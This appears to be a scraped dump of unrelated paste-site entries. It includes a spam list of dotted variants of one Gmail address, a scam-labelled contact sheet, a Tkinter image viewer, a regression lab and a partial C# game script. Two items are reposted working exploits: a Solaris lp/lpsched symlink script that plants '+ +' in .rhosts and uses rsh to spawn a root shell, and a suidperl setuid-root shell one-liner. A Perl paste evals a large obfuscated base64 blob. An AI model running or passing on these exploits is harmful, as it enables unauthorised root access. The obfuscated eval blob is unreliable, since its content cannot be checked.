<a href=""mailto:a.lli.e.dsecur.i.t.iesuk@gmail.com"">a.lli.e.dsecur.i.t.iesuk@gmail.com</a>
<a href=""mailto:al.l.ied.sec.u.r.i.t.ie.suk@gmail.com"">al.l.ied.sec.u.r.i.t.ie.suk@gmail.com</a>
<a href=""mailto:a.llie.d.se.c.u.r.itie.su.k@gmail.com"">a.llie.d.se.c.u.r.itie.su.k@gmail.com</a>
<a href=""mailto:alli.ed.s.ecur.it.i.esu.k@gmail.com"">alli.ed.s.ecur.it.i.esu.k@gmail.com</a>
<a href=""mailto:allied.s.ecu.r.ities.uk@gmail.com"">allied.s.ecu.r.ities.uk@gmail.com</a>
<a href=""mailto:allied.secur.it.i.es.uk@gmail.com"">allied.secur.it.i.es.uk@gmail.com</a>
<a href=""mailto:alli.ed.s.ec.u.rit.ie.s.u.k@gmail.com"">alli.ed.s.ec.u.rit.ie.s.u.k@gmail.com</a>
<a href=""mailto:a.lli.ed.sec.u.ritie.s.u.k@gmail.com"">a.lli.ed.sec.u.ritie.s.u.k@gmail.com</a>
<a href=""mailto:a.l.lied.s.e.c.u.rit.ie.s.uk@gmail.com"">a.l.lied.s.e.c.u.rit.ie.s.uk@gmail.com</a>
<a href=""mailto:a.ll.i.ed.s.e.cu.r.i.tie.su.k@gmail.com"">a.ll.i.ed.s.e.cu.r.i.tie.su.k@gmail.com</a>
<a href=""mailto:a.l.li.ed.s.ec.ur.i.tiesu.k@gmail.com"">a.l.li.ed.s.ec.ur.i.tiesu.k@gmail.com</a>
<a href=""mailto:al.li.ed.sec.u.r.it.ie.s.uk@gmail.com"">al.li.ed.sec.u.r.it.ie.s.uk@gmail.com</a>
<a href=""mailto:allied.sec.ur.i.t.ie.su.k@gmail.com"">allied.sec.ur.i.t.ie.su.k@gmail.com</a>
<a href=""mailto:a.lli.edsec.uri.t.ie.s.uk@gmail.com"">a.lli.edsec.uri.t.ie.s.uk@gmail.com</a>
<a href=""mailto:alli.ed.secu.r.it.ies.uk@gmail.com"">alli.ed.secu.r.it.ies.uk@gmail.com</a>
<a href=""mailto:a.ll.iedsec.ur.iti.e.suk@gmail.com"">a.ll.iedsec.ur.iti.e.suk@gmail.com</a>
<a href=""mailto:all.i.e.d.sec.ur.i.ties.u.k@gmail.com"">all.i.e.d.sec.ur.i.ties.u.k@gmail.com</a>
<a href=""mailto:allie.d.se.cur.it.ie.s.uk@gmail.com"">allie.d.se.cur.it.ie.s.uk@gmail.com</a>
<a href=""mailto:all.ie.d.sec.u.r.it.i.e.s.u.k@gmail.com"">all.ie.d.sec.u.r.it.i.e.s.u.k@gmail.com</a>
<a href=""mailto:a.ll.i.e.ds.ec.u.rit.iesuk@gmail.com"">a.ll.i.e.ds.ec.u.rit.iesuk@gmail.com</a>
<a href=""mailto:al.l.ieds.ec.u.riti.es.u.k@gmail.com"">al.l.ieds.ec.u.riti.es.u.k@gmail.com</a>
<a href=""mailto:a.llieds.e.cu.rit.iesu.k@gmail.com"">a.llieds.e.cu.rit.iesu.k@gmail.com</a>
<a href=""mailto:all.iedse.curit.i.esuk@gmail.com"">all.iedse.curit.i.esuk@gmail.com</a>
<a href=""mailto:a.ll.i.e.d.sec.ur.iti.e.s.uk@gmail.com"">a.ll.i.e.d.sec.ur.iti.e.s.uk@gmail.com</a>
<a href=""mailto:a.ll.ie.ds.e.cu.rit.i.e.s.uk@gmail.com"">a.ll.ie.ds.e.cu.rit.i.e.s.uk@gmail.com</a>
<a href=""mailto:all.ie.dse.c.uri.t.ie.su.k@gmail.com"">all.ie.dse.c.uri.t.ie.su.k@gmail.com</a>
<a href=""mailto:a.l.l.i.e.dsec.u.rit.ies.uk@gmail.com"">a.l.l.i.e.dsec.u.rit.ies.uk@gmail.com</a>
<a href=""mailto:all.ied.s.e.c.u.r.it.i.es.uk@gmail.com"">all.ied.s.e.c.u.r.it.i.es.uk@gmail.com</a>
<a href=""mailto:a.lli.e.dse.c.u.ri.ti.es.u.k@gmail.com"">a.lli.e.dse.c.u.ri.ti.es.u.k@gmail.com</a>
<a href=""mailto:al.l.ie.d.s.ecur.iti.esu.k@gmail.com"">al.l.ie.d.s.ecur.iti.esu.k@gmail.com</a>
<a href=""mailto:a.l.l.i.eds.e.cu.r.i.ti.e.suk@gmail.com"">a.l.l.i.eds.e.cu.r.i.ti.e.suk@gmail.com</a>
<a href=""mailto:a.ll.ie.d.s.e.c.ur.it.iesuk@gmail.com"">a.ll.ie.d.s.e.c.ur.it.iesuk@gmail.com</a>
<a href=""mailto:alliedsecur.i.ti.es.uk@gmail.com"">alliedsecur.i.ti.es.uk@gmail.com</a>
<a href=""mailto:a.ll.ieds.ec.uriti.e.su.k@gmail.com"">a.ll.ieds.ec.uriti.e.su.k@gmail.com</a>
<a href=""mailto:al.l.i.e.d.se.c.u.r.ities.u.k@gmail.com"">al.l.i.e.d.se.c.u.r.ities.u.k@gmail.com</a>
<a href=""mailto:a.l.l.ieds.ec.ur.iti.e.s.uk@gmail.com"">a.l.l.ieds.ec.ur.iti.e.s.uk@gmail.com</a>
<a href=""mailto:a.ll.i.ed.s.ecu.rit.i.es.uk@gmail.com"">a.ll.i.ed.s.ecu.rit.i.es.uk@gmail.com</a>
<a href=""mailto:all.i.e.dsec.u.r.i.t.i.e.s.u.k@gmail.com"">all.i.e.dsec.u.r.i.t.i.e.s.u.k@gmail.com</a>
<a href=""mailto:al.lied.se.c.uri.t.iesuk@gmail.com"">al.lied.se.c.uri.t.iesuk@gmail.com</a>
<a href=""mailto:al.li.e.dsec.uri.t.i.esu.k@gmail.com"">al.li.e.dsec.uri.t.i.esu.k@gmail.com</a>
<a href=""mailto:all.ieds.ec.ur.i.ti.es.uk@gmail.com"">all.ieds.ec.ur.i.ti.es.uk@gmail.com</a>
<a href=""mailto:a.l.lie.d.s.e.cu.ritie.suk@gmail.com"">a.l.lie.d.s.e.cu.ritie.suk@gmail.com</a>
<a href=""mailto:a.l.li.ed.se.cu.r.it.ies.uk@gmail.com"">a.l.li.ed.se.cu.r.it.ies.uk@gmail.com</a>
<a href=""mailto:a.l.l.ie.d.sec.u.r.it.i.e.s.u.k@gmail.com"">a.l.l.ie.d.sec.u.r.it.i.e.s.u.k@gmail.com</a>
<a href=""mailto:a.llie.d.s.ec.ur.i.t.i.e.s.u.k@gmail.com"">a.llie.d.s.ec.ur.i.t.i.e.s.u.k@gmail.com</a>
<a href=""mailto:a.l.l.i.ed.s.ecur.it.i.esuk@gmail.com"">a.l.l.i.ed.s.ecur.it.i.esuk@gmail.com</a>
<a href=""mailto:al.l.i.e.ds.e.c.u.ri.t.ie.s.uk@gmail.com"">al.l.i.e.ds.e.c.u.ri.t.ie.s.uk@gmail.com</a>
<a href=""mailto:a.l.li.e.dse.c.uri.ti.e.s.uk@gmail.com"">a.l.li.e.dse.c.uri.ti.e.s.uk@gmail.com</a>
<a href=""mailto:al.l.i.e.d.secu.r.iti.esuk@gmail.com"">al.l.i.e.d.secu.r.iti.esuk@gmail.com</a>
<a href=""mailto:alli.e.ds.e.c.u.r.it.iesu.k@gmail.com"">alli.e.ds.e.c.u.r.it.iesu.k@gmail.com</a>
<a href=""mailto:alli.e.ds.ecu.r.it.ies.u.k@gmail.com"">alli.e.ds.ecu.r.it.ies.u.k@gmail.com</a>
<a href=""mailto:al.l.ied.s.e.curi.tie.suk@gmail.com"">al.l.ied.s.e.curi.tie.suk@gmail.com</a>
<a href=""mailto:al.lieds.e.c.uri.t.i.es.uk@gmail.com"">al.lieds.e.c.uri.t.i.es.uk@gmail.com</a>
<a href=""mailto:al.l.ied.s.e.c.ur.it.ie.s.uk@gmail.com"">al.l.ied.s.e.c.ur.it.ie.s.uk@gmail.com</a>
<a href=""mailto:alli.e.d.se.cu.r.i.t.i.e.s.uk@gmail.com"">alli.e.d.se.cu.r.i.t.i.e.s.uk@gmail.com</a>
<a href=""mailto:alli.e.d.se.c.ur.it.ies.uk@gmail.com"">alli.e.d.se.c.ur.it.ies.uk@gmail.com</a>
<a href=""mailto:a.llie.dse.c.uritie.s.uk@gmail.com"">a.llie.dse.c.uritie.s.uk@gmail.com</a>
<a href=""mailto:a.llie.d.s.e.c.u.riti.esu.k@gmail.com"">a.llie.d.s.e.c.u.riti.esu.k@gmail.com</a>
<a href=""mailto:a.l.l.i.ed.sec.u.ritie.su.k@gmail.com"">a.l.l.i.ed.sec.u.ritie.su.k@gmail.com</a>
<a href=""mailto:alli.e.d.secu.r.i.t.iesu.k@gmail.com"">alli.e.d.secu.r.i.t.iesu.k@gmail.com</a>
<a href=""mailto:a.l.l.i.e.ds.ecur.it.ies.uk@gmail.com"">a.l.l.i.e.ds.ecur.it.ies.uk@gmail.com</a>
<a href=""mailto:a.l.l.ie.dse.c.u.r.it.i.e.s.uk@gmail.com"">a.l.l.ie.dse.c.u.r.it.i.e.s.uk@gmail.com</a>
<a href=""mailto:al.li.e.d.se.cur.it.ie.s.uk@gmail.com"">al.li.e.d.se.cur.it.ie.s.uk@gmail.com</a>
<a href=""mailto:all.i.ed.s.e.cu.ri.t.ie.s.u.k@gmail.com"">all.i.ed.s.e.cu.ri.t.ie.s.u.k@gmail.com</a>
<a href=""mailto:all.i.eds.ec.ur.itiesuk@gmail.com"">all.i.eds.ec.ur.itiesuk@gmail.com</a>
<a href=""mailto:alli.e.dse.c.u.r.iti.esuk@gmail.com"">alli.e.dse.c.u.r.iti.esuk@gmail.com</a>
<a href=""mailto:al.l.ie.d.se.c.u.ri.t.iesu.k@gmail.com"">al.l.ie.d.se.c.u.ri.t.iesu.k@gmail.com</a>
<a href=""mailto:alliedsec.u.ri.ti.es.uk@gmail.com"">alliedsec.u.ri.ti.es.uk@gmail.com</a>
<a href=""mailto:al.l.ie.dsecu.r.i.t.ie.s.u.k@gmail.com"">al.l.ie.dsecu.r.i.t.ie.s.u.k@gmail.com</a>
<a href=""mailto:a.l.lie.ds.e.c.u.r.iti.e.su.k@gmail.com"">a.l.lie.ds.e.c.u.r.iti.e.su.k@gmail.com</a>
<a href=""mailto:al.li.e.dsecu.rit.iesu.k@gmail.com"">al.li.e.dsecu.rit.iesu.k@gmail.com</a>
<a href=""mailto:a.llie.d.s.e.c.urit.ie.suk@gmail.com"">a.llie.d.s.e.c.urit.ie.suk@gmail.com</a>
<a href=""mailto:a.l.l.i.e.d.securi.tie.suk@gmail.com"">a.l.l.i.e.d.securi.tie.suk@gmail.com</a>
<a href=""mailto:al.l.ied.s.ecur.itiesuk@gmail.com"">al.l.ied.s.ecur.itiesuk@gmail.com</a>
<a href=""mailto:a.lli.edse.c.u.riti.es.uk@gmail.com"">a.lli.edse.c.u.riti.es.uk@gmail.com</a>
<a href=""mailto:a.l.liedse.curit.iesu.k@gmail.com"">a.l.liedse.curit.iesu.k@gmail.com</a>
<a href=""mailto:allied.secu.ritie.su.k@gmail.com"">allied.secu.ritie.su.k@gmail.com</a>
<a href=""mailto:a.ll.ied.secu.ritie.s.u.k@gmail.com"">a.ll.ied.secu.ritie.s.u.k@gmail.com</a>
<a href=""mailto:alli.e.dsec.u.r.i.t.i.esuk@gmail.com"">alli.e.dsec.u.r.i.t.i.esuk@gmail.com</a>
<a href=""mailto:a.lli.e.dse.cu.ri.ti.esuk@gmail.com"">a.lli.e.dse.cu.ri.ti.esuk@gmail.com</a>
<a href=""mailto:a.ll.ie.d.s.ec.u.r.i.t.ies.uk@gmail.com"">a.ll.ie.d.s.ec.u.r.i.t.ies.uk@gmail.com</a>
<a href=""mailto:al.li.e.ds.e.c.ur.it.i.e.suk@gmail.com"">al.li.e.ds.e.c.ur.it.i.e.suk@gmail.com</a>
<a href=""mailto:al.l.ie.dsec.urit.ies.uk@gmail.com"">al.l.ie.dsec.urit.ies.uk@gmail.com</a>
<a href=""mailto:a.lli.eds.ec.u.ritie.s.u.k@gmail.com"">a.lli.eds.ec.u.ritie.s.u.k@gmail.com</a>
<a href=""mailto:allie.ds.e.curi.ti.e.suk@gmail.com"">allie.ds.e.curi.ti.e.suk@gmail.com</a>
<a href=""mailto:a.l.l.i.e.d.secu.r.i.t.ie.su.k@gmail.com"">a.l.l.i.e.d.secu.r.i.t.ie.su.k@gmail.com</a>
<a href=""mailto:a.lli.e.d.sec.u.r.i.t.i.es.uk@gmail.com"">a.lli.e.d.sec.u.r.i.t.i.es.uk@gmail.com</a>
<a href=""mailto:a.lli.e.d.s.ecur.i.t.ie.suk@gmail.com"">a.lli.e.d.s.ecur.i.t.ie.suk@gmail.com</a>
<a href=""mailto:al.l.ied.s.ec.urit.i.e.suk@gmail.com"">al.l.ied.s.ec.urit.i.e.suk@gmail.com</a>
<a href=""mailto:a.l.li.e.d.securit.ie.s.uk@gmail.com"">a.l.li.e.d.securit.ie.s.uk@gmail.com</a>
<a href=""mailto:a.lli.edsecuritie.s.uk@gmail.com"">a.lli.edsecuritie.s.uk@gmail.com</a>
<a href=""mailto:all.ie.ds.e.curi.ties.u.k@gmail.com"">all.ie.ds.e.curi.ties.u.k@gmail.com</a>
<a href=""mailto:a.l.li.edse.cur.i.tie.s.uk@gmail.com"">a.l.li.edse.cur.i.tie.s.uk@gmail.com</a>
<a href=""mailto:a.l.l.i.ed.s.e.cu.r.it.ies.u.k@gmail.com"">a.l.l.i.ed.s.e.cu.r.it.ies.u.k@gmail.com</a>
<a href=""mailto:a.llie.dse.cur.itie.s.u.k@gmail.com"">a.llie.dse.cur.itie.s.u.k@gmail.com</a>
<a href=""mailto:a.l.l.ieds.e.cu.r.it.i.es.uk@gmail.com"">a.l.l.ieds.e.cu.r.it.i.es.uk@gmail.com</a>
<a href=""mailto:a.lli.e.d.secur.it.i.e.s.u.k@gmail.com"">a.lli.e.d.secur.it.i.e.s.u.k@gmail.com</a>
<a href=""mailto:allied.sec.u.ri.t.i.es.uk@gmail.com"">allied.sec.u.ri.t.i.es.uk@gmail.com</a>"
8vWLmndn,Mad,Unknown_No_1,PHP,Sunday 25th of February 2024 10:47:55 PM CDT,IxLOVExYOUxMAD
6aDgNZTV,David Jones - Spam - Scam,bombaires,HTML,Sunday 25th of February 2024 10:35:27 PM CDT,"<pre>
<h1>David Jones</h1>
572 Swan St - Burnley - Victoria 3121 - Australia
<a href=""tel:+61292665544"">+61 2 9266 5544</a> Phone
<a href=""mailto:adarcy@davidjones.com.au"">adarcy@davidjones.com.au</a>
<a href=""mailto:careers@davidjones.com.au"">careers@davidjones.com.au</a>
<a href=""mailto:contactus@davidjones.com.au"">contactus@davidjones.com.au</a>
<a href=""mailto:drdavidjnellor421@yahoo.com"">drdavidjnellor421@yahoo.com</a>
<a href=""mailto:hrcentre_qld@davidjones.com.au"">hrcentre_qld@davidjones.com.au</a>
<a href=""mailto:hrcentre_sa@davidjones.com.au"">hrcentre_sa@davidjones.com.au</a>
<a href=""mailto:contact@davidjones.com.au"">contact@davidjones.com.au</a>
<a href=""mailto:hrcentre_vic@davidjones.com.au"">hrcentre_vic@davidjones.com.au</a>
<a href=""mailto:hrcentre_wa@davidjones.com.au"">hrcentre_wa@davidjones.com.au</a>
<a href=""mailto:info@davidjones.com.au"">info@davidjones.com.au</a>
<a href=""mailto:jdinicola@davidjones.com.au"">jdinicola@davidjones.com.au</a>
<a href=""mailto:online@davidjones.com.au"">online@davidjones.com.au</a>
<a href=""mailto:onseven@davidjones.com.au"">onseven@davidjones.com.au</a>
<a href=""mailto:privacy@davidjones.com.au"">privacy@davidjones.com.au</a>
<a href=""mailto:optin@sub.davidjones.com.au"">optin@sub.davidjones.com.au</a>
<a href=""mailto:privacy@davidjones.com.au"">privacy@davidjones.com.au</a>
</pre>"
G6E8ZC1x,PICTURE-VIEWER.py,Najeebsk,Python,Sunday 25th of February 2024 10:31:08 PM CDT,"import tkinter as tk
from PIL import Image, ImageTk
import glob

def insertfiles():
    for filename in glob.glob(""*.png""):
        lst.insert(tk.END, filename)
    for filename in glob.glob(""*.jpg""):
        lst.insert(tk.END, filename)

def showimg(event):
    n = lst.curselection()
    if n:
        filename = lst.get(n[0])
        img = Image.open(filename)
        w_img, h_img = img.size
        
        # Get the dimensions of the window
        w_win = root.winfo_width()
        h_win = root.winfo_height()
        
        # Calculate the aspect ratio of the image and window
        aspect_ratio_img = w_img / h_img
        aspect_ratio_win = w_win / h_win
        
        if aspect_ratio_img > aspect_ratio_win:
            # Scale the image based on width
            new_w = w_win
            new_h = int(w_win / aspect_ratio_img)
        else:
            # Scale the image based on height
            new_h = h_win
            new_w = int(h_win * aspect_ratio_img)
        
        img = img.resize((new_w, new_h), Image.LANCZOS)  # Use LANCZOS for resampling
        photo = ImageTk.PhotoImage(img)
        canvas.config(width=new_w, height=new_h)
        canvas.create_image(0, 0, image=photo, anchor=tk.NW)
        canvas.image = photo

root = tk.Tk()
root.geometry(""800x600+300+50"")

# Create a frame to hold the listbox and scrollbar
frame = tk.Frame(root)
frame.pack(side=""left"", fill=""y"")

# Create a vertical scrollbar
scrollbar = tk.Scrollbar(frame, orient=""vertical"")

# Create the listbox with the scrollbar attached
lst = tk.Listbox(frame, width=15, yscrollcommand=scrollbar.set)
scrollbar.config(command=lst.yview)

# Pack the listbox and scrollbar
lst.pack(side=""left"", fill=""both"", expand=True)
scrollbar.pack(side=""right"", fill=""y"")

lst.bind(""<<ListboxSelect>>"", showimg)
insertfiles()
canvas = tk.Canvas(root)
canvas.pack(fill=tk.BOTH, expand=True)

root.mainloop()
"
F4xxV8EJ,numpy lab(26/02/2024),brandblox,Python,Sunday 25th of February 2024 10:25:32 PM CDT,"import numpy as np
import matplotlib.pyplot as plt

def estimate_coef(x, y):
    # number of observations/points
    n = np.size(x)
    
    # mean of x and y vector
    m_x = np.mean(x)
    m_y = np.mean(y)
    
    # calculating cross-deviation and deviation about x
    SS_xy = np.sum(y * x) - n * m_y * m_x
    SS_xx = np.sum(x * x) - n * m_x * m_x
    
    # calculating regression coefficients
    b_1 = SS_xy / SS_xx
    b_0 = m_y - b_1 * m_x
    print(""b_0"", b_0)
    print(""b_1"", b_1)
    return (b_0, b_1)

def plot_regression_line(x, y, b):
    # plotting the actual points as scatter plot
    plt.scatter(x, y, color=""m"", marker=""o"", s=30)
    
    # predicted response vector
    y_pred = b[0] + b[1] * x
    
    # plotting the regression line
    plt.plot(x, y_pred, color=""g"")
    
    # putting labels
    plt.xlabel('x')
    plt.ylabel('y')
    
# observations / data
x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])
y = np.array([1, 3, 2, 5, 7, 8, 8, 9, 10, 12])
    
# estimating coefficients
b = estimate_coef(x, y)
plot_regression_line(x, y, b)

output:
https://ibb.co/xmMGCbm

# Predict the speed of a 10-year old car.
import matplotlib.pyplot as plt
from scipy import stats

x = [5, 7, 8, 7, 2, 17, 2, 9, 4, 11, 12, 9, 6]
y = [99, 86, 87, 88, 111, 86, 103, 87, 94, 78, 77, 85, 86]

slope, intercept, r, p, std_err = stats.linregress(x, y)

def myfunc(x):
    return slope * x + intercept

mymodel = list(map(myfunc, x))

plt.scatter(x, y)
plt.plot(x, mymodel)
plt.show()

speed = myfunc(10)
print(speed)

# Example of bad-fit
import matplotlib.pyplot as plt
from scipy import stats

x = [89,43,36,36,95,10,66,34,38,20,26,29,48,
     64,6 ,5 ,36 ,66 ,72 ,40]
y = [21 ,46 ,3 ,35 ,67 ,95 ,53 ,72 ,58 ,10 ,
     26 ,34 ,90 ,33 ,38 ,20 ,56 ,2 ,47 ,15]

slope, intercept,r,p,std_err = stats.linregress(x,y)

def myfunc(x):
    return slope * x + intercept

mymodel = list(map(myfunc,x))

plt.scatter(x,y)
plt.plot(x,mymodel)
plt.show()

print(r)

output:
https://ibb.co/3F6nXwZ
https://ibb.co/k3jv8xM
"
s9ze3zmt,decrypted.AES.pl,paperline27,Perl,Sunday 25th of February 2024 10:04:16 PM CDT,"eval(qw'JHdVI1RRV1ZOVUxRWFpWYUZkWVZGWjFXVU5HV1Zaa01rOVVSRlZWZVU1
QkNVRlZWRTFkV2s1R1lWVXhUbXhpVmtkMFdrVmtSbHBOVGxST1dFSkVU
RlpTVkZKM1JtNVdXV3RrUzBac1dYbHJlRlZsVlRCWFZFc3lSbFZOUjFa
V1JWUkJORWx5U2s1V1dsWnRSbHBsV1Zac1VsTkNjRlpOV0VKV1pFZEdk
VkpWU1hkaE1uQlRVekJhTUdFeGJISlhWekZVUm1WbFIzZGlWbGRrUzBo
UlZXSkZXbFp3Vm5OU1pGcFZWRlJPWVUxclduTldhMmhpVm1SR1ZWcEda
RlJXVkZaM1kwVmFiMk14WkdzNVZFSmtNV3RvV1ZjeFdsWkZOWGhhUjBa
TFVURktiR1JGTlVkV1ZFcDFVbFpXZDFaRmNITmhiVVpvVmxac1RsUnVW
a1ZXVlZKb1pHeG9WMVl4V2t4V1ZtUldVMWhvV0ZkV1duQlZha1ozVTBk
a1JtUnVUbFpOVmxwcFlqTndTRlpIT1ZkTlYyaElWV3hzY1ZadE5YTlpi
bk5UVFZkT1UwMVZPVXRXTW5oTFRrVmtjV0pWTVZoaVJscHJWak5vVDFs
V1pGZE5NbEowVjJwR1RtUXhTbkpVYkdScllraEdlVlJ0TlZOV1ZscHpX
V3RLUjFOcVFscGxSbXcyWkRKRmVHTkhlRVJXUlVwR1UxWldWMVl5VGxa
WGJGcFVWR3BDYjJGRlZscFdiWGhyVjJ4V1MyTXhjRU5UUmxwSVdrWlNS
VkZ0U2tkYVJtUnBVbXhTY2xwSGFIcFZNRnBZVkZaV1ZGUnNjRlpVYkZa
TFlUSnJlbHBFVWxwV1ZFcHNVa2RTTWxKR1drWmFWVnAxVGtac1IwOVVU
bFpVVldSYVZGVXdlRnBJU2xaV1ZFb3lWbFJXVDFaclVraEdiRnBGWlVa
S1VtVkdUazlWTVUxNVVtNUNXRkl4YkhSU01VcHdZa1ZLY1dGRlZtaE5W
M0J2VkcxNGMxTklRbFZaYkdSYVYxWlNjVlJVU1hoV01GcHhWMFphV21G
VVZtNVpWbXhrVkd4V1MxZFlhR3RXYTNCV1pXdGFXbUpWT1U1bGVGTkdW
M0JwVmxVd1dYcGhSbWhaWVZKb1ZuQlZha2w0WlVkV1ZHSnRVbGRrUjFK
SVZHeEtkRkp0ZUdGaE1scFpXV3hLY2xkR2FFOVZNRnBoVm01U2IxTkdT
bGRqUmxaeVkwVTFkbFJWV2xwV1ZFb3hVbGRHV0dGR1pEUlZhMmhYVmpO
V1ZXSlhjRlpYV0dSV1ZXdG9hVkpWY0U5aVJuQlhUVzE0Vld4c1NrbE5W
bk5YVjJwR1RsUlZWa3RUUlZwT1ZURktXbFpIYUc5aU1XUklWMGR3U1ZW
dGVITlVNVnBIWkZkU2MxZHJXbk5sUm5Bd1ZteE9RMVJyTlV0V2ExSllX
akpGZVdWc1ZrZGtNREZQVkcxV1IxTnNXWGxhUjNoaFZtMUdkVlZzVWxw
WGJFNWFZbGhvVmxkdWNGaFNiRnB6Vm1wS1IxTldSbk5rUmxwcFZqSjRk
MVpGTlZkV2VrSm9VbGRrV0ZadGRFNU5SbkJwVmpCV1JWVXhVa2hYYWta
WFlUSjRhMDFIVm1oVVZFcDBWbTB4ZUdKRk5YaGFWbEpYVmtkS1JsTnVT
a3hXUlVwb1ZXcEdUbEpzY0ZoV2JFcHJWbFJzV21Wc1pGTmlSM1JXWlVa
V1RtSldSbHBPYkZKd1drVTVhMmh5V1hoWFZsWkhZa2RSYXpWcVlsVldi
RkpzY0ZWV01VcHpWbFJzV0dRd1dYbE5hMXBMV1cxNGFHRXhiRlJpV0hC
V1ZGVmFTbEpVU1hwV1Jsb3dVMnRrYUZSV1JuTlJWbFp6VTJwQ1NWTnJN
WEpXTVVwVVZWYz"
t8fbTc2p,Solaris 2.5.1 lp / lpsched - Symlink,FlyFar,Bash,Sunday 25th of February 2024 09:58:17 PM CDT,"#!/bin/sh
#
# lpNet & temp file exploit:
#   break lp, then use lp priv to break root (or bin, etc...).
#
#   Written by: Chris Sheldon (csh@viewgraphics.com)
#
#   Tested on Solaris-2.5.1:
#     SunOS testhost 5.5.1 Generic sun4m sparc SUNW,SPARCstation-20
#
#   Caveat: This system is running without patches. Sun released
#     patch 103959-03 for 2.5.1 on Feb 27, 1997. lpNet and lpsched
#     were replaced in that patch, but the patch README does not
#     mention anything about a temp file or permissions problem.
#     103959-03 is in the recommended patch list, but not in the
#     ""Patches containing security fixes"" list.
#
#   This way (not using HP JetAdmin) *seems* to only work when you have
#   a postscript-only defined printer. If you send an ascii job to the
#   print queue, lpNet will invoke several of the /usr/lib/lp/postscript
#   programs to convert the ascii into postscript. One of them, postio(1),
#   creates a temp file in /var/tmp mode 666. If the request is sent from
#   a remote system (eg. handled by lpNet), then postio(1) runs as lp and
#   creates /var/tmp/<printer-name>.log as lp mode 666.
#
#   Here's part of the /var/lp/logs/request file:
#
#   = lp0-71, uid -1, gid -1, size 123, Sat May  3 03:26:14 PDT 1997
#   x /usr/lib/lp/postscript/postprint
#   y /usr/lib/lp/postscript/download -plp0|/usr/lib/lp/postscript/postio \
#       2>>$ERRFILE -L/var/tmp/lp0.log
#   t simple
#
#   What if you don't have a PS-only printer? Well, if you are using
#   the HP JetAdmin software and are running the hpnp daemon, then
#   you're just as vulnerable. The JetAdmin software creates a temp
#   file /var/tmp/jadump as lp with mode 666. It's happily follows
#   symlinks.
#
#   So, then exploit essentially is:
#     ln -s ~lp/.rhosts /var/tmp/<printer-name.log>
#      -or-
#     ln -s ~lp/.rhosts /var/tmp/jadump
#     rsh somehost lp somefile.txt
#     echo ""+ +"" >> ~lp/.rhosts
#     rsh -l lp localhost /bin/sh -i
#     mv /var/lp/logs/lpsched /var/lp/logs/lpsched.save
#     ln -s /.rhosts /var/lp/logs/lpsched
#     /usr/sbin/lpshut
#     /usr/lib/lpsched
#     mv /var/lp/logs/lpsched.save /var/lp/logs/lpsched
#     echo ""+ +"" >> /.rhosts
#     rsh -l root localhost /bin/sh -i
#
#  Note: This won't clobber the permissions on an existing /.rhosts
#    file, but you can always symlink to /usr/bin/.rhosts.
#
#  Workaround:
#    Put ""umask 022"" in /etc/init.d/lp. /var/tmp/<printer-name>.log
#      will be mode 644. This also makes /var/lp/logs/lpsched
#      created as mode 644.
#    For /var/tmp/jadump, the umask trick didn't work. I just made
#    /usr/spool/lp 755 root/root (was 775 lp/lp).
#
#  I suppose as a general principal, it's a good thing to go around
#  as root and touch /.rhosts /usr/bin/.rhosts /usr/spool/lp/.rhosts
#  and /var/adm/.rhosts as 600 root/root. I also run a script which
#  checks the files (and their contents) on a regular basis.
#
#  Perhaps there should be a file called /etc/rusers which, like the
#  /etc/ftpusers file, denies any user in that file password-less
#  r-service access.
#
#  Of course, you still have to worry about things like .forward.
#  A more draconian approach would be to change /var/spool/lp to
#  mode 755 and owned by root. What would this break?? (anything?)
#
#  This is the JetAdmin/hpnpd script:
#

#
# Usage stuff.
if [ ""$1"" = """" ]; then
  echo ""Usage: lp-exp <remote-host> [remote printer name]""
  echo ""         remote-host: host must have networked printer""
  echo ""           with the main spool on the local system.""
  exit
else
  remlp=$1
fi

#
# Specify a different queue
if [ ""$2"" != """" ]; then
  remqn=$2
fi

#
# Check for ~lp/.rhosts
if [ -f /usr/spool/lp/.rhosts ]; then
  echo ""lp's .rhosts file exists... sorry""
  exit
fi

#
# Check if hpnpd is running
if [ ""`ps -e | grep hpnpd`"" != """" ]; then
  echo ""found hpnpd running""
  rm -f /var/tmp/jadump
  ln -s /usr/spool/lp/.rhosts /var/tmp/jadump
else
  echo ""If you have a postscript only printer, try that (see comments).""
  exit
fi

#
# print some data on a remote system
if [ ""$remlp"" = """" ]; then
  rsh $remlp ""echo ASCII-STRING | lp""
else
  rsh $remlp ""echo ASCII-STRING | lp -d$remqn""
fi

sleep 3

#
# Check for the new .rhosts file and break root
if [ -f /usr/spool/lp/.rhosts ]; then
  rm -f /var/tmp/jadump
  echo ""+ +"" >> /usr/spool/lp/.rhosts

  rsh -l lp localhost ""rm /usr/spool/lp/.rhosts ;\
    mv /var/lp/logs/lpsched /var/lp/logs/lpsched.save ;\
    ln -s /.rhosts /var/lp/logs/lpsched ;\
    /usr/sbin/lpshut ;\
    sleep 3 ;\
    /usr/lib/lpsched ;\
    mv /var/lp/logs/lpsched.save /var/lp/logs/lpsched ;\
    echo \""+ +\"" >> /.rhosts""
else
  echo ""Hmmm... no .rhosts file was created.""
  exit
fi

rsh -l root localhost /bin/sh -i

#
#
#

# milw0rm.com [1997-05-03]
            "
A3CcmAw2,suid_perl 5.001 - Command Execution - CVE-1999-0034,FlyFar,Bash,Sunday 25th of February 2024 09:54:21 PM CDT,"#!/usr/bin/suidperl -U
$ENV{PATH}=""/bin:/usr/bin"";
$>=0;$<=0;
exec(""/bin/bash"");


# milw0rm.com [1996-06-01]
            "
2xp2kr9Q,Space Engineers PB LCD_Helper Class,WaGi-Coding,C#,Sunday 25th of February 2024 09:49:27 PM CDT,"using Sandbox.ModAPI.Ingame;
using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Linq;
using IMyTerminalBlock = Sandbox.ModAPI.Ingame.IMyTerminalBlock;
using IMyTextSurface = Sandbox.ModAPI.Ingame.IMyTextSurface;
using IMyTextSurfaceProvider = Sandbox.ModAPI.Ingame.IMyTextSurfaceProvider;

namespace IngameScript
{
    partial class Program
    {
        public class LCD_Helper
        {
            MyGridProgram _program;

            public Action<IMyTextSurface> InitSurface = null;

            public LCD_Helper(MyGridProgram program)
            {
                _program = program;
            }

            private List<string> GetArgs(string input)
            {
                List<string> args = new List<string>();

                if (input.Contains(':') && input.Split(':').Count() >= 2)
                {
                    input = input.Split(':')[1];
                    string tmpVal = input.TrimStart('[');
                    tmpVal = tmpVal.TrimEnd(']');
                    foreach (string arg in tmpVal.Split('|'))
                    {
                        args.Add(arg);
                    }
                }

                return args;
            }

